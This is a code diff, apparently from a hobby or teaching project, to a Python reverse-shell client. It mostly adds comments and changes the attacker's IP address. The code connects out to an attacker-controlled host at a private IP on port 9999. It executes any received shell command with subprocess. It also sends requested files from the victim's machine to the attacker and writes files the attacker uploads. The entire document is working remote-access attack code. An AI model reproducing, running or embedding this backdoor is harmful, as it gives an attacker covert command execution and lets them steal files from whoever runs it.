@@ -3,12 +3,17 @@ import socket
 import subprocess
 import time
 
-#Manipulate the commands received from the attacker; also the new operation download / upload files
+'''
+	Function used to manipulate the commands received from the attacker; 
+				also the new operation download / upload files
+'''
 def receive_commands():
     while True:
 
         data = s.recv(1024)
-
+        '''
+	    In the case of the 'cd' shell command, change the directory path to the new one
+        '''
         if data[:3].decode("utf-8") == 'cd ':
             try:
                 cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -19,9 +24,10 @@ def receive_commands():
 
             except FileNotFoundError:
                 s.send(output_bytes + str.encode(os.getcwd() + '> '))
-
         elif data[:8].decode("utf-8") == 'download':
-
+            '''
+		In the case of the 'download' command, send the file needed by attacker
+            '''
             file_name = data[9:].decode("utf-8")
             try:
                 with open(file_name, 'rb') as f:
@@ -40,8 +46,10 @@ def receive_commands():
                 s.send(str.encode("Requested file not found"))
                 time.sleep(0.3)
                 s.send(str.encode(os.getcwd() + '> '))
-
         elif data[:6].decode("utf-8") == 'upload':
+            '''
+		In the case of the 'upload' command, receive the file added by attacker
+            '''
             down_file = data[7:]
             receive_file = True
             data = s.recv(1024)
@@ -57,8 +65,11 @@ def receive_commands():
                     else:
                         f.write(data)
                         data = s.recv(1024)
-
         elif len(data) > 0:
+            '''
+        	In other cases, execute another shell command using a child program in a new process
+				the command must be typed as in a shell prompt
+            '''
             cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
@@ -68,14 +79,15 @@ def receive_commands():
         while not data:
             connect_to_server()
 
-
-#Create connection with the attacker + manage the incoming commands
+'''
+	Function used to create connection with the attacker + manage the incoming commands
+'''
 def connect_to_server():
     try:
         global host
         global port
         global s
-        host = "192.168.0.102"
+        host = "192.168.0.45"
         port = 9999
         s = socket.socket()
         s.connect((host, port))
